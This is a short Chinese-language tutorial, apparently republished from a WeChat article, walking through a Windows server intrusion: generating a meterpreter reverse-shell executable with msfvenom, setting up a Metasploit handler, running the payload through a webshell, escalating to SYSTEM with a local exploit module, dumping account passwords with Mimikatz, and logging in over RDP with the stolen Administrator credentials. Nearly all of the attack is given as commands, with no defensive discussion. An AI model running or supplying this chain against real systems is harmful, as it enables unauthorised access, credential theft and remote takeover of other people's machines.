# 服务器提权及Mimikatz密码获取

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI5MTM4NzYwNw==&mid=2247483674&idx=1&sn=c5925523fe12d5d4c195c7337e3502d5&chksm=ec1020a2db67a9b4e8dab346e033fe339a981f534c10e001559ac87057c0d24835ca68279e04&scene=126&sessionid=1681663751#rd](http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&mid=2247483674&idx=1&sn=c5925523fe12d5d4c195c7337e3502d5&chksm=ec1020a2db67a9b4e8dab346e033fe339a981f534c10e001559ac87057c0d24835ca68279e04&scene=126&sessionid=1681663751#rd)

Mimikatz是一款在内网渗透中，广泛使用的密码抓取神器。它类似于法国神器 getpass ，利用它我们可以在不修改和添加账户的情况下，直接获取管理员甚至域账户的密码。下面来简单演示下操作过程！

首先我们利用 msfvenom 来生成一个反弹shell程序。

**msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.1.111 LPORT=4444 -f exe -o /root/2003.exe**

![](../Images/5178f4ce37bfd736bece82c0600064ef.png)

同时，我们再来创建一个反弹处理进程。

**use exploit/multi/handler**

**set payload windows/meterpreter/reverse\_tcp**

**set lhost 192.168.1.111**

**exploit -j**

![](../Images/0c5878c1a34ea5df9418b9409c0761af.png)  ![](../Images/b092e9a1f98e953d7fd05132bf309f7c.png)

然后我们来到 webshell 界面，将生成的 EXE 文件上传到可读可写目录，并执行该程序！

![](../Images/efaba1516a0e906d41026ab466df0f1d.png)

接着我们就可以在处理会话界面看到有两个反弹会话，这里我选择第一个。

**sessions -i 1**

![](../Images/f1341a3112698211682ea85e875741a3.png)

到这里我们还不是系统权限，下面我们用溢出程序进行提权操作。

**use exploit/windows/local/ms11\_080\_…..**

**set session 1**

**exploit**

![](../Images/cd89eb28de336946ac780053984dee0e.png)

此时，我们使用 **getuid** 命令，就可以看到权限已经提升为 **system** 权限！

![](../Images/4476e5a4fc1673499b2ea650c896d95e.png)

接着我们来载入 mimikatz 模块。

**load mimikatz**

![](../Images/7b2e8615c9838384c75c6f0c24cb334d.png)

使用** kerberos** 来取得系统的账户密码信息。

![](../Images/629dcc5fd992ef0ab0c590dae13ef2b5.png)

最后，我们就可以使用 rdesktop 协议，来远程连接 3389 了！

**rdesktop -f 192.168.1.115:3389 -u Administrator -p 2003**

![](../Images/3103a2568110eb5848f12311678de6e0.png)
